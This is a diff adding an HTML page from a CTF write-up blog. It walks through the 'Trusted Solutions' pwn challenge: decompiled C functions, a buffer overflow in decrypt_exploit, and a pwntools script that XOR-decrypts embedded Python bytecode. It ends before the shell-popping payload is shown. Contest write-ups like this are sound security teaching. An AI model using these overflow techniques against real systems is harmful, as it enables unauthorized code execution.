@@ -1,0 +1,383 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\ddc-qualifiers-2023">DDC-Qualifiers 2023</a>
+            <a href="/CTF-writeups\ddc-qualifiers-2023\trusted-solutions/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>Trusted Solutions</span>
+            <span class="text-right">[1]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>We are given a netcat port and a zip-file, containing the source binary.</p>
+<blockquote>
+<p><strong>Proposed difficulty:</strong> Hard<br />
+<strong>Kategori:</strong> Binary Exploitation<br />
+<strong>Opgave beskrivelse</strong> Du har lige købt en enhed fra "Trusted Solutions".</p>
+<p>De sælger 0day exploits, og deres nyeste burde være et af de bedste. De påstår at have state-of-the-art anti reversing, og enheden er svær at få adgang til.</p>
+<p>Du kan tilgå porten, der unlocker og executer exploitet, men kan du få RCE?</p>
+<p>nc trusted-solutions.hkn 1024</p>
+<p><a href="https://nextcloud.ntp-event.dk:8443/s/kjiRC8fs3FNSbJG/download/trusted-solutions.zip">trusted-solutions.zip</a></p>
+</blockquote>
+<hr />
+<h3>TLDR</h3>
+<p><code>decrypt_exploit</code> contains an unrestricted buffer overflow, allowing the user to overflow into a buffer holding python bytecode, which is then written to a file. The program then proceeds to execute this pyc file. By overflowing the buffer with bytecode for popping a shell, we can obtain a shell on the system, giving us the flag.</p>
+<hr />
+<h3>Initial recon</h3>
+<p>To get an overview of the code, let's open it up in ghidra to see what it actually does. It contains 4 functions of interest:</p>
+<ul>
+<li>
+<p><code>main</code></p>
+</li>
+<li>
+<p><code>login</code></p>
+</li>
+<li>
+<p><code>hash_func</code></p>
+</li>
+<li>
+<p><code>decrypt_exploit</code></p>
+</li>
+</ul>
+<p>The main function is fairly simple:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">res</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">setup</span><span class="p">();</span>
+<span class="w">  </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">login</span><span class="p">();</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Error in username or password&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">decrypt_exploit</span><span class="p">();</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>It first calls login, then checks whether it returned false. We can presume it checked a password of some kind. Interestingly, the program continues despite an "incorrect" password. This would seem to suggest, that the real magic happens in <code>decrypt_exploit</code>. Let's check <code>login</code> first:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">bool</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">cmp</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">in_FS_OFFSET</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="p">[</span><span class="mi">72</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">canary</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please log in!&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Password: &quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%63s[^</span><span class="se">\n</span><span class="s">]&quot;</span><span class="p">,</span><span class="n">password</span><span class="p">);</span>
+<span class="w">  </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash_func</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="n">hash</span><span class="p">);</span>
+<span class="w">  </span><span class="n">cmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strcmp</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="s">&quot;5777777256277277772126770000000000000000&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">hash</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">hash</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">canary</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
+<span class="w">    </span><span class="n">__stack_chk_fail</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">cmp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Immediately a lot more interesting. It seems to take a users password input, put it through some hash function, then verifies whether or not the hash matches a hardcoded hash. The scanf used here is safe, and there is a stack canary, so let's go deeper:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">hash_func</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ulong</span><span class="w"> </span><span class="n">len</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">local_25</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x29</span><span class="p">);</span>
+<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x29</span><span class="p">);</span>
+<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="sa">L</span><span class="sc">&#39;0&#39;</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
+<span class="w">  </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="mi">29</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;End of the program....&quot;</span><span class="p">);</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_25</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;1&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">local_25</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;2&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sc">&#39;7&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">local_25</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;3&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sc">&#39;C&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">local_25</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;4&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sc">&#39;M&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">local_25</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;5&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sc">&#39;W&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">local_25</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;6&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sc">&#39;a&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">local_25</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;7&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">hash</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_25</span><span class="p">;</span>
+<span class="w">    </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">hash</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Weird... Nothing stands out. We could probably generate a password hashing into the correct value, given the simplicity of the algorithm, but the program gives no good reason to do so. Let's jump back up to main and check out <code>decrypt_exploit</code> instead:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">decrypt_exploit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">lVar1</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">code_pointer</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buff_pointer</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">in_FS_OFFSET</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">key_len</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">f</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined8</span><span class="w"> </span><span class="n">local_750</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_748</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined8</span><span class="w"> </span><span class="n">local_740</span><span class="p">;</span>
+<span class="w">  </span><span class="n">byte</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buff</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">acStack_716</span><span class="w"> </span><span class="p">[</span><span class="mi">1798</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">canary</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+<span class="w">  </span><span class="n">code_pointer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">code</span><span class="p">;</span>
+<span class="w">  </span><span class="n">buff_pointer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">buff</span><span class="p">;</span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">lVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xdf</span><span class="p">;</span><span class="w"> </span><span class="n">lVar1</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">lVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buff_pointer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">code_pointer</span><span class="p">;</span>
+<span class="w">    </span><span class="n">code_pointer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">code_pointer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">;</span>
+<span class="w">    </span><span class="n">buff_pointer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buff_pointer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="o">*</span><span class="p">(</span><span class="n">undefined2</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buff_pointer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">undefined2</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">code_pointer</span><span class="p">;</span>
+<span class="w">  </span><span class="n">buff_pointer</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">code_pointer</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Provide size of key:&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">key_len</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Provide the key bytes:&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">key_len</span><span class="p">);</span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">1787</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">(</span><span class="o">&amp;</span><span class="n">buff</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">buff</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">key</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="p">];</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;./12893.pyc&quot;</span><span class="p">,</span><span class="mh">0x242</span><span class="p">,</span><span class="mh">0x1b6</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">f</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Error opening file!&quot;</span><span class="p">);</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buff</span><span class="p">,</span><span class="mh">0x6fb</span><span class="p">);</span>
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+<span class="w">  </span><span class="n">local_748</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;./12893.pyc&quot;</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_740</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_750</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/python3 12893.pyc&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">canary</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
+<span class="w">    </span><span class="n">__stack_chk_fail</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Here we have something. The first section of code, seems to copy some bytes named <code>code</code> from a global to the stack. Then it takes a key size and key, after which it does some xoring on the buffer. It then writes the output to a pyc file, and attempts to execute it.</p>
+<p>pyc files represent python bytecode, a form of semi-compiled code that python <em>actually</em> executes. The XOR section of the code is a little confusing, due to the type-casting that's going on, but it can be reduced to:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="p">]</span>
+</code></pre></div>
+
+<p>Very odd. Despite accepting any length of key, this would only XOR with the first two bytes interchangeably.</p>
+<p>Also notice the lines:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">key_len</span><span class="p">);</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">&quot;Provide the key bytes:&quot;</span><span class="p">);</span>
+<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">key_len</span><span class="p">);</span>
+</code></pre></div>
+
+<p>An easy buffer overflow, but we'll wait with that.</p>
+<hr />
+<h3>Getting the bytecode</h3>
+<p>As mentioned in recon, the python bytecode is xored with alternately the first and second bytes of our key input. With a bit of googling, it is revealed, that the pyc magic bytes change depending on the version of python. Importantly though, the third and fourth bytes are always 0D0A, as in b"\r\n".</p>
+<p>Reading the third and fourth bytes from the binary, we get 1E3D. Doing a simple XOR with 0D0A, yields 1337, heh. Building a script around this:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./trusted_partners&quot;</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x13\x37</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>And the program outputs the pyc file. Trying to execute it, and...</p>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>python3<span class="w"> </span><span class="m">12893</span>.pyc
+RuntimeError:<span class="w"> </span>Bad<span class="w"> </span>magic<span class="w"> </span>number<span class="w"> </span><span class="k">in</span><span class="w"> </span>.pyc<span class="w"> </span>file
+</code></pre></div>
+
+<p>Well, that either means it's corrupted, or it's the wrong python version. Check the magic bytes 6F0D0D0A online, and some sketchy websites would indicate that it's python 3.10. Bummer, i have 3.11. All hope is not lost, after changing the magic bytes, python 3.8 on the windows side seems to execute it somewhat successfully, though executing random bytecode is probably a bad idea... Anyway, it's good to know that 3.8 and 3.10 are somewhat compatible. Let's check what the remote does:</p>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>python3<span class="w"> </span>solve.py
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Opening<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>trusted-solutions.hkn<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">1024</span>:<span class="w"> </span>Done
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive<span class="w"> </span>mode
+
+ctf
+Running<span class="w"> </span>exploit...
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Leaking<span class="w"> </span>pointers...
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="m">4751193</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="m">4309086</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="m">5046567</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="m">4325350</span>
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Trust<span class="w"> </span>zone<span class="w"> </span>found
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Leaking<span class="w"> </span>PAC<span class="w"> </span>upper<span class="w"> </span>bits
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>them!
+<span class="o">[</span>:<span class="o">)]</span><span class="w"> </span>Executing<span class="w"> </span>/bin/sh
